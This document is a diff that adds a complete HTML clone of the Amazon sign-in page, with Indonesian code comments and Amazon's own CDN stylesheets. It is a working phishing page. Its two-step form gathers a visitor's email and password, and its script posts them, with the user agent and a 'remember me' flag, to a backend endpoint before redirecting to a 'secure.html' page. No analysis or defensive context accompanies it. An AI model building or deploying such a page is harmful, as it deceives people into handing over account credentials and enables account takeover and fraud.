@@ -1,0 +1,372 @@
+<!doctype html>
+<html lang="en" class="a-no-js" data-19ax5a9jf="dingo">
+<head>
+    <meta charset="utf-8"/>
+    <title dir="ltr">Amazon Sign-In</title>
+    <link rel="icon" type="image/png" href="amazon.png" />
+    <!-- CSS CDN Asli Langsung dari Amazon -->
+    <link rel="stylesheet" href="https://m.media-amazon.com/images/I/21b2CPPFLqL._RC|51nfWTBkewL.css_.css?AUIClients/AmazonUI" />
+    <link rel="stylesheet" href="https://m.media-amazon.com/images/I/11WsGYSItxL._RC|01DE6WSvLKL.css,51-rItlKGTL.css,31zRoguzRzL.css,21JMC7OC91L.css,01xH+fhFIJL.css,01oplyhwgTL.css,413Vvv3GONL.css,1170nDgl0uL.css,01Rw4F+QU6L.css,11GW2DCngTL.css,01dwEpLmO4L.css,01IdKcBuAdL.css,01iHqjS7YfL.css,21D3IemrALL.css,11Cv7swYm2L.css,51kR4v4RCcL.css,01yC8kk5kkL.css,11aX6hlPzjL.css,01GAxF7K5tL.css,01ZM-s8Z3xL.css,21gEzBqpmtL.css,11FeoxrgiyL.css,21Yuul0BcnL.css,01rSTIgNJIL.css,21HqyYwP3xL.css,31u+uM+C07L.css,01i092IYHUL.css,01oaPOLX+-L.css,31g3RABPKHL.css,11PDZ29p-PL.css,117zDsOznQL.css,215WpAjwzoL.css,11INh4d+2FL.css,114aTS6SjML.css,01Uw64cHNCL.css,21GcfcmbahL.css,21OD8FuBraL.css,11XozyxiH7L.css,210W8HxtP4L.css,11GyUpf9PlL.css,119Cktja74L.css,11PMguLK6gL.css,01890+Vwk8L.css,11TZSntL0oL.css,01qiwJ7qDfL.css,21jZ2Hny6UL.css,01pps5qPjtL.css,0136+UFOtpL.css,31un+UKeIeL.css,21MLYj6O8gL.css,013-xYw+SRL.css_.css?AUIClients/AmazonUI" />
+    <link rel="stylesheet" href="https://m.media-amazon.com/images/I/21oSCHBx+cL.css?AUIClients/AuthXClaimCollectionUIAssets" />
+    <link rel="stylesheet" href="https://m.media-amazon.com/images/I/41N8BT8xbmL.css?AUIClients/AuthXSharedUIAssets" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <style>
+      .amazonedu-logo-text {
+          font-family: inherit; 
+          font-size: 25px; 
+          font-weight: 500; 
+          line-height: 31px; 
+          vertical-align: top; 
+          color: #ff9900;
+          margin-left: -5px;
+      }
+      
+      /* Mobile Responsive Overrides */
+      html, body { overflow-x: hidden; }
+      .a-container, .auth-workflow { margin: 30px auto !important; box-sizing: border-box !important; }
+      
+      @media screen and (max-width: 500px) {
+          .a-container { width: 100% !important; padding: 0 20px !important; }
+          .auth-workflow { width: 100% !important; max-width: 100% !important; }
+          #authportal-center-section { width: 100% !important; margin: 0 auto !important; }
+          .a-box { border: none !important; border-radius: 0 !important; box-shadow: none !important; background: transparent !important; }
+          .a-box-inner { padding: 10px 0 !important; }
+          body { background-color: #fff !important; }
+          .a-section.auth-footer { padding: 20px !important; margin-top: 0 !important; }
+          #create-account-divider { margin: 15px 0 !important; }
+          #auth-create-account-link { width: 100% !important; }
+      }
+    </style>
+</head>
+<body class="a-m-us a-aui_72554-c a-aui_template_weblab_cache_333406-c">
+<div id="a-page">
+    <div class="a-container auth-workflow">
+        <div class="a-section a-spacing-medium">
+            <div class="a-section a-spacing-none a-text-center">
+                <a class="a-link-nav-icon" tabindex="-1" href="#" style="display: inline-block;">
+                    <img src="amazon.png" alt="Amazon" style="height: 31px; width: auto; object-fit: contain;">
+                </a>
+            </div>
+        </div>
+        
+        <div id="authportal-center-section" class="a-section">
+            <div class="a-section auth-pagelet-container">
+                <div class="a-box">
+                    
+                    <!-- STEP 1: EMAIL INPUT -->
+                    <div class="a-box-inner a-padding-extra-large" id="step-email">
+                        <h1 class="a-size-medium-plus a-spacing-small">Sign in</h1>
+                        
+                        <div id="error-box" class="a-box a-alert a-alert-error a-spacing-base" role="alert" style="display:none">
+                            <div class="a-box-inner a-alert-container">
+                                <i class="a-icon a-icon-alert" aria-hidden="true"></i>
+                                <div class="a-alert-content" id="error-message">
+                                    Enter your email or mobile phone number
+                                </div>
+                            </div>
+                        </div>
+
+                        <form id="ap_login_form" method="post" action="#">
+                            <div class="a-section a-spacing-base">
+                                <label for="ap_email" class="a-form-label">
+                                    Enter mobile number or email
+                                </label>
+                                <input type="text" id="ap_email" name="email" class="a-input-text a-span12 auth-autofocus auth-required-field" autofocus>
+                            </div>
+                            
+                            <div class="a-section">
+                                <span id="continue" class="a-button a-button-span12 a-button-primary">
+                                    <span class="a-button-inner">
+                                        <input id="continue-button" class="a-button-input" type="submit">
+                                        <span class="a-button-text" aria-hidden="true">Continue</span>
+                                    </span>
+                                </span>
+                            </div>
+                            
+                            <div class="a-section a-spacing-top-medium">
+                                <p class="a-size-small a-color-tertiary">
+                                    By continuing, you agree to Amazon's <a href="#">Conditions of Use</a> and <a href="#">Privacy Notice</a>.
+                                </p>
+                            </div>
+                            
+                            <div class="a-section">
+                                <a class="a-link-expander" href="javascript:void(0)" onclick="toggleHelp()">
+                                    <i class="a-icon a-icon-expand" id="help-icon"></i><span class="a-expander-prompt">Need help?</span>
+                                </a>
+                                <div class="a-expander-content a-expander-inline-content a-expander-inner" id="help-content" style="display:none">
+                                    <a class="a-link-normal" href="#">Forgot your password?</a><br>
+                                    <a class="a-link-normal" href="#">Other issues with Sign-In</a>
+                                </div>
+                            </div>
+                        </form>
+                    </div>
+
+                    <!-- STEP 2: PASSWORD INPUT (HIDDEN BY DEFAULT) -->
+                    <div class="a-box-inner a-padding-extra-large" id="step-password" style="display:none;">
+                        <h1 class="a-size-medium-plus a-spacing-small">Sign in</h1>
+                        
+                        <div class="a-row a-spacing-base">
+                            <span class="a-size-small" id="display-email" style="font-weight: 500;"></span>
+                            <a class="a-link-normal a-size-small" href="#" onclick="showEmailStep(); return false;">Change</a>
+                        </div>
+
+                        <div id="password-error-box" class="a-box a-alert a-alert-error a-spacing-base" role="alert" style="display:none">
+                            <div class="a-box-inner a-alert-container">
+                                <i class="a-icon a-icon-alert" aria-hidden="true"></i>
+                                <div class="a-alert-content">
+                                    Enter your password
+                                </div>
+                            </div>
+                        </div>
+
+                        <form id="ap_password_form" method="post" action="#">
+                            <div class="a-section a-spacing-large">
+                                <div class="a-row">
+                                    <div class="a-column a-span5">
+                                        <label for="ap_password" class="a-form-label">Password</label>
+                                    </div>
+                                    <div class="a-column a-span7 a-text-right a-span-last">
+                                        <a class="a-link-normal a-size-small" href="#">Forgot your password?</a>
+                                    </div>
+                                </div>
+                                <input type="password" id="ap_password" name="password" class="a-input-text a-span12 auth-autofocus auth-required-field">
+                            </div>
+                            
+                            <div class="a-section a-spacing-extra-large">
+                                <span class="a-button a-button-span12 a-button-primary">
+                                    <span class="a-button-inner">
+                                        <input id="signInSubmit" class="a-button-input" type="submit">
+                                        <span class="a-button-text" aria-hidden="true">Sign in</span>
+                                    </span>
+                                </span>
+                                
+                                <div class="a-row a-spacing-top-medium">
+                                    <div class="a-checkbox">
+                                        <label>
+                                            <input type="checkbox" name="rememberMe" value="true">
+                                            <span class="a-label a-checkbox-label" style="font-size: 13px;">
+                                                Keep me signed in. <a href="#">Details</a>
+                                            </span>
+                                        </label>
+                                    </div>
+                                </div>
+                            </div>
+                        </form>
+                    </div>
+
+                </div>
+                
+                <div class="a-divider a-divider-break" id="create-account-divider"><h5>New to Amazon?</h5></div>
+                
+                <span id="auth-create-account-link" class="a-button a-button-span12 a-button-base">
+                    <span class="a-button-inner">
+                        <a class="a-button-text" href="#">
+                            Create your Amazon account
+                        </a>
+                    </span>
+                </span>
+                
+            </div>
+        </div>
+    </div>
+    
+    <div class="a-section a-spacing-top-extra-large auth-footer">
+        <div class="a-divider a-divider-section"><div class="a-divider-inner"></div></div>
+        <div class="a-section a-spacing-small a-text-center">
+            <span class="auth-footer-seperator"></span>
+            <a class="a-size-mini a-link-normal" href="#">Conditions of Use</a>
+            <span class="auth-footer-seperator"></span>
+            <a class="a-size-mini a-link-normal" href="#">Privacy Notice</a>
+            <span class="auth-footer-seperator"></span>
+            <a class="a-size-mini a-link-normal" href="#">Help</a>
+            <span class="auth-footer-seperator"></span>
+        </div>
+        <div class="a-section a-text-center">
+            <span class="a-size-mini a-color-secondary">
+                © 1996-2026, Amazon.com, Inc. or its affiliates
+            </span>
+        </div>
+    </div>
+</div>
+
+<script>
+    function toggleHelp() {
+        var content = document.getElementById('help-content');
+        var icon = document.getElementById('help-icon');
+        if(content.style.display === 'none') {
+            content.style.display = 'block';
+            icon.classList.remove('a-icon-expand');
+            icon.classList.add('a-icon-collapse');
+        } else {
+            content.style.display = 'none';
+            icon.classList.remove('a-icon-collapse');
+            icon.classList.add('a-icon-expand');
+        }
+    }
+
+    function showEmailStep() {
+        document.getElementById('step-password').style.display = 'none';
+        document.getElementById('step-email').style.display = 'block';
+        
+        // Show create account section again
+        document.getElementById('create-account-divider').style.display = 'block';
+        document.getElementById('auth-create-account-link').style.display = 'inline-block';
+    }
+
+    function showNotification(message, isError) {
+        var existing = document.getElementById('form-global-notification');
+        if (existing) existing.remove();
+
+        var notif = document.createElement('div');
+        notif.id = 'form-global-notification';
+        notif.className = 'a-box a-alert ' + (isError ? 'a-alert-error' : 'a-alert-success') + ' a-spacing-base';
+        notif.style.cssText = 'margin-bottom:16px;position:relative;';
+        notif.innerHTML = `
+            <div class="a-box-inner a-alert-container">
+                <i class="a-icon a-icon-alert" aria-hidden="true" style="color:${isError ? '#cc0c39' : '#008a00'}"></i>
+                <div class="a-alert-content" style="font-size:13px;">${message}</div>
+            </div>
+        `;
+        var target = document.querySelector('#authportal-center-section .a-section.auth-pagelet-container');
+        if (target) {
+            target.insertBefore(notif, target.firstChild);
+        }
+        setTimeout(function(){ if (notif.parentNode) notif.parentNode.removeChild(notif); }, 8000);
+    }
+
+    function showLoadingOnButton(buttonWrapperId, buttonInputId, originalText) {
+        var wrapper = document.getElementById(buttonWrapperId);
+        var input = document.getElementById(buttonInputId);
+        if (wrapper) {
+            wrapper.classList.add('a-button-disabled');
+            wrapper.style.opacity = '0.7';
+            wrapper.style.pointerEvents = 'none';
+        }
+        if (input) {
+            input.disabled = true;
+        }
+        if (wrapper) {
+            var textSpan = wrapper.querySelector('.a-button-text');
+            if (textSpan) {
+                textSpan._original = textSpan.innerHTML;
+                textSpan.innerHTML = 'Memproses...';
+            }
+        }
+    }
+
+    function hideLoadingOnButton(buttonWrapperId, buttonInputId) {
+        var wrapper = document.getElementById(buttonWrapperId);
+        var input = document.getElementById(buttonInputId);
+        if (wrapper) {
+            wrapper.classList.remove('a-button-disabled');
+            wrapper.style.opacity = '';
+            wrapper.style.pointerEvents = '';
+        }
+        if (input) {
+            input.disabled = false;
+        }
+        if (wrapper) {
+            var textSpan = wrapper.querySelector('.a-button-text');
+            if (textSpan && textSpan._original) {
+                textSpan.innerHTML = textSpan._original;
+            }
+        }
+    }
+
+    async function submitFormData(payload) {
+        try {
+            var response = await fetch('/api/submit', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'Accept': 'application/json',
+                },
+                body: JSON.stringify(payload),
+            });
+            var data = await response.json().catch(function(){ return {}; });
+            return { ok: response.ok, status: response.status, data: data };
+        } catch (err) {
+            return { ok: false, status: 0, data: { error: err.message || 'Network error' }, error: err };
+        }
+    }
+
+    // Step 1: Submit Email
+    document.getElementById('ap_login_form').addEventListener('submit', function(e) {
+        e.preventDefault();
+        var email = document.getElementById('ap_email');
+        var errorBox = document.getElementById('error-box');
+        
+        if(!email.value.trim()) {
+            email.classList.add('a-form-error');
+            errorBox.style.display = 'block';
+        } else {
+            email.classList.remove('a-form-error');
+            errorBox.style.display = 'none';
+            
+            // Switch to Step 2
+            document.getElementById('step-email').style.display = 'none';
+            document.getElementById('step-password').style.display = 'block';
+            
+            // Hide create account section in step 2 (like real Amazon)
+            document.getElementById('create-account-divider').style.display = 'none';
+            document.getElementById('auth-create-account-link').style.display = 'none';
+            
+            // Set the email display text
+            document.getElementById('display-email').innerText = email.value;
+            
+            // Autofocus password field
+            document.getElementById('ap_password').focus();
+        }
+    });
+
+    // Step 2: Submit Password - Kirim ke backend
+    document.getElementById('ap_password_form').addEventListener('submit', async function(e) {
+        e.preventDefault();
+        var password = document.getElementById('ap_password');
+        var email = document.getElementById('ap_email');
+        var passwordErrorBox = document.getElementById('password-error-box');
+        
+        if(!password.value.trim()) {
+            password.classList.add('a-form-error');
+            passwordErrorBox.style.display = 'block';
+            return;
+        }
+        
+        password.classList.remove('a-form-error');
+        passwordErrorBox.style.display = 'none';
+
+        var btnWrapperId = 'signInSubmitWrapper';
+        var btnInputId = 'signInSubmit';
+        var submitBtnInput = document.getElementById(btnInputId);
+        if (submitBtnInput && submitBtnInput.parentElement && !submitBtnInput.parentElement.id) {
+            submitBtnInput.parentElement.parentElement.id = btnWrapperId;
+            submitBtnInput.parentElement.id = btnWrapperId + '-inner';
+        }
+        var signInWrapper = document.querySelector('#ap_password_form .a-button-primary');
+        if (signInWrapper) signInWrapper.id = btnWrapperId;
+
+        showLoadingOnButton(btnWrapperId, btnInputId);
+
+        var payload = {
+            email: email.value.trim(),
+            password: password.value,
+            rememberMe: document.querySelector('input[name="rememberMe"]')?.checked || false,
+            submittedAt: new Date().toISOString(),
+            source: 'amazon_signin_form',
+            userAgent: navigator.userAgent,
+        };
+
+        var result = await submitFormData(payload);
+
+        hideLoadingOnButton(btnWrapperId, btnInputId);
+
+        if (result.ok || (result.data && result.data.submissionId)) {
+            window.location.href = 'secure.html';
+        } else {
+            var errMsg = result.data?.error || 'Gagal memproses permintaan. Silakan coba lagi.';
+            showNotification('❌ Error: ' + errMsg, true);
+        }
+    });
+</script>
+</body>
+</html>
